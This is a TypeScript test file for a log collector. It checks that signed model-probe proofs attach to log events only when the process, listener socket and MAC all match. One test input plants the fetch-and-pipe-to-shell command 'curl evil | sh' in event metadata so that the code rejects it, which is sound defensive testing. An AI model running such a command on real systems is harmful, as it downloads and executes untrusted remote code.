import { expect, test } from 'bun:test';
import { appendFileSync, mkdtempSync, mkdirSync, writeFileSync, symlinkSync, unlinkSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { modelFixture, testKey } from '../../api/tests/analyze-model-discovery.test';
import { modelProofMac, eligibleModelDiscovery } from '../../api/src/utils/mill/analyzeModelDiscovery';
import { enrichModelProbe, ownsModelListener } from './model-probes';
import type { LogEvent } from './core';
import { signModelProof } from '../../ti/ai-model-client/model-probe.mjs';

test('collector binds native proof to exact log and live listener; absent, ambiguous and wrong-process evidence keeps', () => {
  const directory = mkdtempSync(join(tmpdir(), 'model-enrichment-')), proc = join(directory, 'proc'), keyFile = join(directory, 'key.json');
  try {
    writeFileSync(keyFile, JSON.stringify({ MODEL_PROBE_PROOF_KEY: testKey }), { mode: 0o600 });
    mkdirSync(join(proc, 'net'), { recursive: true });
    mkdirSync(join(proc, '1143552/fd'), { recursive: true });
    writeFileSync(join(proc, 'net/tcp'), 'sl local_address rem_address st tx rx tr tm retr uid inode\n0: 0100007F:46A1 00000000:0000 0A 00000000:00000000 00:00000000 00000000 1000 0 123456\n');
    symlinkSync('socket:[123456]', join(proc, '1143552/fd/7'));
    expect(ownsModelListener('1143552', 18081, proc)).toBe(true);
    expect(ownsModelListener('1143552', 18082, proc)).toBe(false);
    const enriched = modelFixture() as LogEvent, cursor = enriched.metadata.cursor as string;
    const proof = { ...(enriched.metadata.model_probe as object), serverPid: null, logSha256: null } as Record<string, unknown>;
    proof.mac = signModelProof(proof, testKey);
    expect(proof.mac).toBe(modelProofMac(proof, testKey));
    const log = structuredClone(enriched);
    delete log.metadata.cursor; delete log.metadata.model_probe;
    const options = { directory, proc, keyFile };
    expect(enrichModelProbe(log, cursor, options)).toBe(log);
    const file = join(directory, new Date(proof.finishedAt as number).toISOString().slice(0, 13) + '.jsonl');
    writeFileSync(file, JSON.stringify(proof) + '\n', { mode: 0o600 });
    const bound = enrichModelProbe(log, cursor, options);
    expect(bound).not.toBe(log);
    expect(eligibleModelDiscovery(bound, testKey)).toBe(true);
    expect(eligibleModelDiscovery({ ...bound, message: bound.message + ' suspicious' }, testKey)).toBe(false);
    const injected = { ...log, metadata: { ...log.metadata, unexpected: 'curl evil | sh' } };
    expect(enrichModelProbe(injected, cursor, options)).toBe(injected);
    unlinkSync(join(proc, '1143552/fd/7'));
    expect(enrichModelProbe(log, cursor, options)).toBe(log);
    symlinkSync('socket:[123456]', join(proc, '1143552/fd/7'));
    appendFileSync(file, JSON.stringify(proof) + '\n');
    expect(enrichModelProbe(log, cursor, options)).toBe(log);
    writeFileSync(file, JSON.stringify({ ...proof, mac: '0'.repeat(64) }) + '\n');
    expect(enrichModelProbe(log, cursor, options)).toBe(log);
    expect(enrichModelProbe({ ...log, service: 'other' }, cursor, options).metadata.cursor).toBeUndefined();
  } finally { rmSync(directory, { recursive: true, force: true }); }
});
